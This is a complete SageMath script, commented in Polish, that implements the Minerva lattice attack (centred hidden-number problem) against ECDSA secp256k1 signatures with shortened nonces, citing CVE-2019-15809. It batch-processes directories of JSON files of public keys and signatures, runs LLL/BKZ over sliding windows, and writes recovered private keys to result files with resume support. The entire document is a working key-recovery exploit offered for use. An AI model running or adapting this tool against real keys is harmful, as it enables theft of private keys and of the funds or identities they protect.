#!/usr/bin/sage
"""
minerva.sage -- atak MINERVA na ECDSA secp256k1 (CVE-2019-15809 i pokrewne).

IDEA: nonce ma DOKLADNIE L bitow (np. 128/192/252), bo zepsuty RNG lub wyciek
      timing skraca dlugosc. To bias MSB, ale z WYSRODKOWANIEM: zamiast
      0 <= k < 2^L bierzemy k = 2^(L-1) + u, |u| < 2^(L-1). Wysrodkowanie
      polowi interwal bledu -> krotszy wektor -> krata dziala pewniej niz
      zwykly HNP MSB.

MATEMATYKA (HNP, m podpisow):
  k_i = u_i + t_i*d (mod n),  u_i = z_i/s_i,  t_i = r_i/s_i.
  Bias L bitow: k_i ~ 2^(L-1) + e_i, |e_i| < 2^(L-1) =: B.
  Odejmujemy srodek: u'_i = u_i - 2^(L-1). Wtedy e_i = u'_i + t_i*d ma |e_i|<B.
  Krata jak w HNP: krotki wektor z ostatnia wsp. +-W koduje d.

Detekcja+atak od razu: dla kazdej testowanej dlugosci L budujemy krate; jesli
znajdzie d (d*G==pub) -> sukces. (Sama dlugosc bitowa r NIE zdradza L, bo
r=X(kG) jest jednostajne -> dlatego testujemy zestaw L i weryfikujemy kratą.)

Uzycie:
  sage minerva.sage --file klucz.json
  sage minerva.sage --file klucz.json --bits 128 --max-m 8
  sage minerva.sage --dir /katalog --beta 25
"""
from sage.all import *
import json, sys, time, argparse

n  = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141
p  = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEFFFFFC2F
Gx = 0x79BE667EF9DCBBAC55A06295CE870B07029BFCDB2DCE28D959F2815B16F81798
Gy = 0x483ADA7726A3C4655DA4FBFC0E1108A8FD17B448A68554199C47D08FFB10D4B8
E = EllipticCurve(GF(p), [0, 7])
G = E(Gx, Gy)
n = int(n)

# dlugosci bitowe nonce do przetestowania (L). Dla kazdej ~ potrzeba podpisow.
# im mniejsze L (mocniejszy bias), tym mniej podpisow potrzeba.
DEFAULT_BITS = [252, 248, 224, 192, 160, 128, 96, 64]

def log(msg):
    print(f"[{time.strftime('%H:%M:%S')}] {msg}", flush=True)

def modinv(a):
    return int(pow(int(a) % n, -1, n))

def hnp_centered(ts, us, L, pub, beta):
    """Krata HNP z wysrodkowaniem dla nonce dlugosci L. Zwraca d albo None."""
    m = len(ts)
    B = 1 << (L - 1)                      # |e_i| < B
    center = 1 << (L - 1)
    u2 = [(u - center) % n for u in us]   # przesuniecie o srodek
    C = max(1, n // B)
    W = B
    dim = m + 2
    M = matrix(ZZ, dim, dim)
    for i in range(m):
        M[i, i] = C * n
        M[m, i]     = (C * ts[i]) % (C * n)
        M[m + 1, i] = (-C * u2[i]) % (C * n)
    M[m, m] = 1
    M[m + 1, m + 1] = W
    use_bkz = (beta >= 20 and dim <= beta + 20)
    Bred = M.BKZ(block_size=beta, proof=False) if use_bkz else M.LLL()
    for row in Bred.rows():
        last = int(row[m + 1])
        if abs(last) != W:
            continue
        for sign in (1, -1):
            d = (sign * int(row[m])) % n
            if 1 <= d < n and d * G == pub:
                return d
    return None


def need_sigs(L):
    """Potrzeba podpisow dla nonce dlugosci L bitow (bias = 256-L)."""
    bias = 256 - L
    if bias < 1:
        return 999999
    return max(4, int(256 / bias * 4 / 3))

def attack_key(key_xy, sigs, args):
    try:
        xh, yh = key_xy.split("_")
        pub = E(int(xh, 16), int(yh, 16))
    except Exception:
        log(f"  Zly klucz publiczny: {key_xy[:40]}"); return None

    ts, us = [], []
    for r, s, z in sigs:
        if r == 0 or s == 0:
            continue
        sinv = modinv(s)
        ts.append((r * sinv) % n)
        us.append((z * sinv) % n)
    total = len(ts)
    if total < 4:
        return None
    log(f"Klucz {key_xy[:24]}..  podpisow: {total}")

    bits = [args.bits] if args.bits else DEFAULT_BITS
    for L in bits:
        need = need_sigs(L)
        m = min(need, args.max_m, total)
        if m < 4 or m < need:
            continue
        engine = ("BKZ%d" % args.beta) if (args.beta >= 20 and (m + 2) <= args.beta + 20) else "LLL"
        # przesuwane okna (bias moze byc lokalny)
        step = max(1, int(m * args.step))
        nwin = (total - m) // step + 1
        if args.max_windows and nwin > args.max_windows:
            nwin = args.max_windows
        log(f"  L={L}bit (bias={256-L})  m={m}  okien={nwin}  ({engine}, dim={m+2})")
        for w in range(nwin):
            a0 = w * step; b0 = a0 + m
            if b0 > total:
                break
            d = hnp_centered(ts[a0:b0], us[a0:b0], L, pub, args.beta)
            if d:
                log(f"  ZLAMANO! minerva L={L}bit okno@{a0}  d=0x{d:064x}")
                return {"key": key_xy, "privkey": f"0x{d:064x}",
                        "attack": "minerva", "bits": L, "start": a0, "m": m}
            if (w + 1) % 500 == 0:
                log(f"    L={L} okno {w+1}/{nwin}...")
    return None

def main():
    ap = argparse.ArgumentParser(description="Atak Minerva (skrocona dlugosc nonce, HNP wysrodkowany).")
    src = ap.add_mutually_exclusive_group(required=True)
    src.add_argument("--file")
    src.add_argument("--dir")
    ap.add_argument("--out", default=None)
    ap.add_argument("--bits", type=int, default=None, help="testuj TYLKO te dlugosci L (np. 128). dom. zestaw")
    ap.add_argument("--beta", type=int, default=25, help="block_size BKZ. dom. 25")
    ap.add_argument("--max-m", type=int, default=48, help="max podpisow w oknie. dom. 48")
    ap.add_argument("--step", type=float, default=0.5, help="krok okna jako ulamek m. dom. 0.5")
    ap.add_argument("--max-windows", type=int, default=0, help="limit okien na L. 0=bez")
    ap.add_argument("--resume", action="store_true",
                    help="wznow: pomijaj pliki juz przerobione (wg <out>.progress)")
    ap.add_argument("--progress-every", type=int, default=200,
                    help="loguj postep co N plikow. dom. 200")
    args = ap.parse_args()

    import glob, os
    if args.file:
        files = [args.file]; default_out = args.file.replace(".json", "_minerva.json")
    else:
        files = sorted(glob.glob(os.path.join(args.dir, "*.json")))
        default_out = os.path.join(args.dir, "minerva_results.json")
    out_fn = args.out or default_out
    if not files:
        log("Brak plikow."); sys.exit(1)

    # --- zapis na biezaco + wznawianie ---
    prog_fn = out_fn + ".progress"
    hits_fn = out_fn + ".hits.jsonl"
    def atomic_dump(obj, path):
        tmp = path + ".tmp"; json.dump(obj, open(tmp, "w"), indent=2); os.replace(tmp, path)
    results = []; done = set()
    if args.resume:
        if os.path.exists(prog_fn):
            done = set(l.strip() for l in open(prog_fn) if l.strip())
            log(f"WZNAWIANIE: {len(done)} plikow juz przerobionych.")
        if os.path.exists(hits_fn):
            for line in open(hits_fn):
                line = line.strip()
                if line:
                    try: results.append(json.loads(line))
                    except Exception: pass
            log(f"WZNAWIANIE: wczytano {len(results)} wczesniejszych trafien.")
    prog_f = open(prog_fn, "a"); hits_f = open(hits_fn, "a")

    t0 = time.time(); nf = len(files)
    for idx, fn in enumerate(files, 1):
        if args.resume and fn in done:
            continue
        try:
            data = json.load(open(fn))
        except Exception as e:
            log(f"BLAD {fn}: {e}"); prog_f.write(fn + "\n"); prog_f.flush(); continue
        if not isinstance(data, dict):
            prog_f.write(fn + "\n"); prog_f.flush(); continue   # pomijaj pliki wynikowe/nie-slowniki
        for key_xy, sig_list in data.items():
            sigs = [(int(r, 16), int(s, 16), int(z, 16)) for r, s, z in sig_list]
            res = attack_key(key_xy, sigs, args)
            if res:
                res["file"] = os.path.basename(fn)
                results.append(res)
                hits_f.write(json.dumps(res) + "\n"); hits_f.flush()
                atomic_dump(results, out_fn)
        prog_f.write(fn + "\n"); prog_f.flush()
        if idx % args.progress_every == 0:
            el = time.time() - t0
            log(f"[postep] {idx}/{nf} plikow, zlamano: {len(results)}, {el:.0f}s ({el/idx:.2f}s/plik)")
    prog_f.close(); hits_f.close()
    atomic_dump(results, out_fn)
    log(f"KONIEC ({time.time()-t0:.0f}s). Zlamano {len(results)} -> {out_fn}")

if __name__ == "__main__":
    main()
